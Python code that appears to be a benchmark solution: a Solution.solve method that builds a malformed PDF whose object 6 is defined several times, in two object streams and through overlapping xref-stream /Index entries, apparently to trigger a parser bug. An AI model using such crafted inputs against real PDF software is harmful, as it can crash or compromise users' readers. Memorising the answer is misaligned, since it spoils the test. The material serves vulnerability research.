import struct
from typing import List, Tuple, Dict


def _be(n: int, width: int) -> bytes:
    return n.to_bytes(width, byteorder="big", signed=False)


def _obj(num: int, content: bytes) -> bytes:
    return f"{num} 0 obj\n".encode("ascii") + content + b"\nendobj\n"


def _dict(d: str) -> bytes:
    return (b"<< " + d.encode("ascii") + b" >>")


def _stream(dict_items: str, data: bytes) -> bytes:
    return (
        b"<< "
        + dict_items.encode("ascii")
        + b" /Length "
        + str(len(data)).encode("ascii")
        + b" >>\nstream\n"
        + data
        + b"\nendstream"
    )


def _objstm_stream(embedded: List[Tuple[int, bytes]]) -> Tuple[bytes, int, int]:
    # Returns (stream_data, first, n)
    parts = []
    offsets = []
    cur = 0
    for i, (objnum, objbytes) in enumerate(embedded):
        offsets.append((objnum, cur))
        parts.append(objbytes)
        if i != len(embedded) - 1:
            parts.append(b" ")
            cur += len(objbytes) + 1
        else:
            cur += len(objbytes)

    header = (" ".join(f"{objnum} {off}" for objnum, off in offsets) + " ").encode("ascii")
    first = len(header)
    data = header + b"".join(parts)
    return data, first, len(embedded)


def _xref_entry(t: int, f2: int, f3: int) -> bytes:
    # W = [1,4,2]
    return _be(t, 1) + _be(f2, 4) + _be(f3, 2)


class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b"%PDF-1.5\n%\xE2\xE3\xCF\xD3\n"

        # Objects:
        # 1 Catalog, 2 Pages, 3 Page, 4 Contents, 5 ObjStm, 7 ObjStm, 8 XRef stream
        # Object 6 is compressed and appears multiple times via duplicate xref entries and within objstm 5.

        obj1 = _dict("/Type /Catalog /Pages 2 0 R")
        obj2 = _dict("/Type /Pages /Kids [3 0 R] /Count 1")
        obj3 = _dict("/Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R /Resources 6 0 R")

        contents_data = b"q\nQ\n"
        obj4 = _stream("", contents_data)

        # ObjStm 5 contains object 6 twice (duplicate object id entries)
        o6_a = _dict("/ProcSet [/PDF]")
        o6_b = _dict("/ProcSet [/PDF /Text]")
        objstm5_data, first5, n5 = _objstm_stream([(6, o6_a), (6, o6_b)])
        obj5 = _stream(f"/Type /ObjStm /N {n5} /First {first5}", objstm5_data)

        # ObjStm 7 contains object 6 once (another location for same object id)
        o6_c = _dict("/ProcSet [/PDF /ImageB]")
        objstm7_data, first7, n7 = _objstm_stream([(6, o6_c)])
        obj7 = _stream(f"/Type /ObjStm /N {n7} /First {first7}", objstm7_data)

        # Assemble with placeholder for xref object 8 after we know offsets
        parts: List[Tuple[int, bytes]] = [
            (1, _obj(1, obj1)),
            (2, _obj(2, obj2)),
            (3, _obj(3, obj3)),
            (4, _obj(4, obj4)),
            (5, _obj(5, obj5)),
            (7, _obj(7, obj7)),
        ]

        pdf = bytearray()
        pdf += header

        offsets: Dict[int, int] = {}
        for num, ob in parts:
            offsets[num] = len(pdf)
            pdf += ob

        # XRef stream object number
        xref_num = 8
        offsets[xref_num] = len(pdf)

        # Build xref stream with overlapping /Index entries for object 6 multiple times
        # /Index [0 9 6 1 6 1] => entries: 0..8, plus obj 6 again, plus obj 6 again.
        # Object 6 entries:
        # - In 0..8 range: type 2 -> objstm 5 index 0
        # - dup #1: type 2 -> objstm 5 index 1
        # - dup #2: type 2 -> objstm 7 index 0
        size = 9  # objects 0..8
        entries = []

        # Objects 0..8
        entries.append(_xref_entry(0, 0, 65535))  # obj 0 free
        entries.append(_xref_entry(1, offsets[1], 0))
        entries.append(_xref_entry(1, offsets[2], 0))
        entries.append(_xref_entry(1, offsets[3], 0))
        entries.append(_xref_entry(1, offsets[4], 0))
        entries.append(_xref_entry(1, offsets[5], 0))
        entries.append(_xref_entry(2, 5, 0))  # obj 6: objstm 5, index 0
        entries.append(_xref_entry(1, offsets[7], 0))
        entries.append(_xref_entry(1, offsets[8], 0))  # xref stream itself

        # Duplicate entries for object 6
        entries.append(_xref_entry(2, 5, 1))  # objstm 5, index 1
        entries.append(_xref_entry(2, 7, 0))  # objstm 7, index 0

        xref_data = b"".join(entries)

        xref_dict_items = (
            f"/Type /XRef /W [1 4 2] /Index [0 {size} 6 1 6 1] /Size {size} /Root 1 0 R"
        )
        obj8 = _stream(xref_dict_items, xref_data)
        pdf += _obj(8, obj8)

        startxref = offsets[8]
        pdf += b"startxref\n" + str(startxref).encode("ascii") + b"\n%%EOF\n"

        return bytes(pdf)